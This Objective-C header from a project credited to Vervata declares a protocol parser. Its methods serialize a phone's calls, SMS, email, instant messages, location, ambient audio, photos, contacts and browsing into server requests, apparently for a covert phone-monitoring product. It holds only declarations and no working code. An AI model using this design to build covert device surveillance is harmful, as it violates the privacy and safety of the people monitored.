//
//  ProtocolParser.h
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "SendActivate.h"

@class SendActivate, SendActivateResponse;
@class SendDeactivate, SendDeactivateResponse;
@class SendHeartBeat, SendHeartBeatResponse;
@class SendEvent, SendEventResponse;
@class SendAddressBookForApproval, SendAddressBook,AddressBook;
@class SendAddressBookResponse, SendAddressBookForApprovalResponse;
@class RAskRequest, RAskResponse;

@class CommandMetaDataWrapper;
@class ResponseData;
@class UnknownResponse;

@class Event, CallLogEvent, SMSEvent, EmailEvent, MMSEvent, IMEvent, PanicGPS, PanicImage, AlertGPSEvent, PanicStatus, WallpaperThumbnailEvent;
@class CameraImageThumbnailEvent, AudioFileThumbnailEvent, AudioConversationThumbnailEvent, VideoFileThumbnailEvent, WallpaperEvent, CameraImageEvent;
@class AudioConversationEvent, AudioFileEvent, VideoFileEvent, LocationEvent, GPSEvent, CallInfoEvent, SystemEvent;
@class BrowserUrlEvent, BookmarksEvent, SettingEvent, ALCEvent, AudioAmbientEvent, AudioAmbientThumbnailEvent, IMMessageEvent, IMAccountEvent, IMContactEvent, IMConversationEvent;

@class EmbeddedCallInfo, FxVCard;

@class GetCSID, GetTime, GetProcessProfile, GetCommunicationDirectives, GetConfiguration, GetActivationCode, GetAddressBook, GetSoftwareUpdate, GetIncompatibleApplicationDefinitions;
@class GetCSIDResponse, GetTimeResponse, GetProcessProfileResponse, GetCommunicationDirectivesResponse, GetConfigurationResponse, GetActivationCodeResponse;
@class GetAddressBookResponse, GetSoftwareUpdateResponse, GetIncompatibleApplicationDefinitionsResponse;

@class GetApplicationProfile, GetUrlProfile, SendInstalledApplication, SendRunningApplication, SendBookmark;
@class GetApplicationProfileResponse, GetUrlProfileResponse, SendBookmarkResponse, SendInstalledApplicationResponse, SendRunningApplicationResponse;

@class CalendarEntry, Note;
@class SendCalendarResponse, SendNoteResponse;

@interface ProtocolParser : NSObject {
	
}

+ (NSData *)parseRecipients:(NSArray *)recipients;
+ (NSData *)parseAttachments:(NSArray *)attachments;
+ (NSData *)parseParticipants:(NSArray *)participants;
+ (NSData *)parseEmbeddedCallInfo:(EmbeddedCallInfo *)callInfo;
+ (NSData *)parseActivateRequest:(SendActivate *)command;
+ (NSData *)parseDeactivateRequest:(SendDeactivate *)command;
+ (NSData *)parseHeartbeatRequest:(SendHeartBeat *)command;

#pragma mark -
#pragma mark Event parser

+ (NSData *)parseEventRequest:(SendEvent *)command;
+ (NSData *)parseEvent:(Event *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseCallLogEvent:(CallLogEvent *)event;
+ (NSData *)parseSMSEvent:(SMSEvent *)event;
+ (NSData *)parseEmailEvent:(EmailEvent *)event;
+ (NSData *)parseMMSEvent:(MMSEvent *)event;
+ (NSData *)parseIMEvent:(IMEvent *)event;
+ (NSData *)parsePanicImage:(PanicImage *)event;
+ (NSData *)parsePanicStatus:(PanicStatus *)event;
+ (NSData *)parseWallpaperThumbnailEvent:(WallpaperThumbnailEvent *)event;
+ (NSData *)parseCameraImageThumbnailEvent:(CameraImageThumbnailEvent *)event;
+ (NSData *)parseAudioFileThumbnailEvent:(AudioFileThumbnailEvent *)event;
+ (NSData *)parseAudioConversationThumbnailEvent:(AudioConversationThumbnailEvent *)event;
+ (NSData *)parseVideoFileThumbnailEvent:(VideoFileThumbnailEvent *)event;
+ (NSData *)parseWallpaperEvent:(WallpaperEvent *)event;
+ (NSData *)parseCameraImageEvent:(CameraImageEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseAudioConversationEvent:(AudioConversationEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseAudioFileEvent:(AudioFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseVideoFileEvent:(VideoFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseLocationEvent:(LocationEvent *)event;
+ (NSData *)parseSystemEvent:(SystemEvent *)event;
+ (NSData *) parseBrowserUrlEvent: (BrowserUrlEvent *) aEvent;
+ (NSData *) parseBookmarksEvent: (BookmarksEvent *) aEvent;
+ (NSData *) parseSettingEvent: (SettingEvent *) aEvent;
+ (NSData *) parseApplicationLifeCycleEvent: (ALCEvent *) aEvent;
+ (NSData *) parseAudioAmbientThumbnailEvent: (AudioAmbientThumbnailEvent *) aEvent;
+ (NSData *) parseAudioAmbientEvent:(AudioAmbientEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseIMMessageEvent:(IMMessageEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseIMAccountEvent: (IMAccountEvent *) aEvent;
+ (NSData *) parseIMContactEvent: (IMContactEvent *) aEvent;
+ (NSData *) parseIMConversationEvent: (IMConversationEvent *) aEvent;

#pragma mark -
#pragma mark Note & Calendar entry

+ (NSData *) parseNote: (Note *) aNote;
+ (NSData *) parseCalendarEntry: (CalendarEntry *) aCalendarEntry;

#pragma mark -
#pragma mark Address book parser

+ (NSData *)parseAddressBookForApproval:(SendAddressBookForApproval *)command;
+ (NSData *)parseSendAddressBook:(SendAddressBook *)command;
+ (NSData *)parseAddressBook:(AddressBook *)addressBook;
+ (NSData *)parseVCard:(FxVCard *)vcard;


+ (NSData *)parseGetCSID:(GetCSID *)command;
+ (NSData *)parseGetTime:(GetTime *)command;
+ (NSData *)parseGetProcessProfile:(GetProcessProfile *)command;
+ (NSData *)parseGetCommunicationDirectives:(GetCommunicationDirectives *)command;
+ (NSData *)parseGetConfiguration:(GetConfiguration *)command;
+ (NSData *)parseGetActivationCode:(GetActivationCode *)command;
+ (NSData *)parseGetAddressBook:(GetAddressBook *)command;
+ (NSData *)parseGetSoftwareUpdate:(GetSoftwareUpdate *)command;
+ (NSData *)parseGetIncompatibleApplicationDefinitions:(GetIncompatibleApplicationDefinitions *)command;
+ (NSData *) parseGetApplicationProfile: (GetApplicationProfile *) aCommand;
+ (NSData *) parseGetUrlProfile: (GetUrlProfile *) aCommand;

#pragma mark -
#pragma mark Parse server response
+ (id)parseServerResponse:(NSData *)responseData;
+ (int)parseServerResponseHeader:(NSData *)responseData to:(id)responseObj;

+ (SendActivateResponse *)parseSendActivateResponse:(NSData *)responseData;
+ (SendDeactivateResponse *)parseSendDeactivateResponse:(NSData *)responseData;
+ (SendHeartBeatResponse *)parseSendHeartBeatResponse:(NSData *)responseData;
+ (SendEventResponse *)parseSendEventResponse:(NSData *)responseData;
+ (SendAddressBookResponse *)parseSendAddressBookResponse:(NSData *)responseData;
+ (SendAddressBookForApprovalResponse *)parseSendAddressBookForApprovalResponse:(NSData *)responseData;
+ (RAskResponse *)parseRAskResponse:(NSData *)responseData;
+ (UnknownResponse *)parseUnknownResponse:(NSData *)responseData;

+ (GetCSIDResponse *)parseGetCSIDResponse:(NSData *)responseData;
+ (GetTimeResponse *)parseGetTimeResponse:(NSData *)responseData;
+ (GetProcessProfileResponse *)parseGetProcessProfileResponse:(NSData *)responseData;
+ (GetCommunicationDirectivesResponse *)parseGetCommunicationDirectivesResponse:(NSData *)responseData;
+ (GetConfigurationResponse *)parseGetConfigurationResponse:(NSData *)responseData;
+ (GetActivationCodeResponse *)parseGetActivationCodeResponse:(NSData *)responseData;
+ (GetAddressBookResponse *)parseGetAddressBookResponse:(NSString *)responseFilePath offset:(unsigned long)offset;
+ (GetSoftwareUpdateResponse *)parseGetSoftwareUpdateResponse:(NSData *)responseData;
+ (GetIncompatibleApplicationDefinitionsResponse *)parseGetIncompatibleApplicationDefinitionsResponse:(NSData *)responseData;

+ (SendRunningApplicationResponse *) parseSendRunningApplicationResponse: (NSData *) aResponseData;
+ (SendInstalledApplicationResponse *) parseSendInstalledApplicationResponse: (NSData *) aResponseData;
+ (SendBookmarkResponse *) parseSendBookmarkResponse: (NSData *) aResponseData;

+ (SendCalendarResponse *) parseSendCalendarResponse: (NSData *) aResponseData;
+ (SendNoteResponse *) parseSendNoteResponse: (NSData *) aResponseData;

+ (id) parseFileResponse: (NSString *) aResponseFilePath offset: (unsigned long) aOffset;

@end
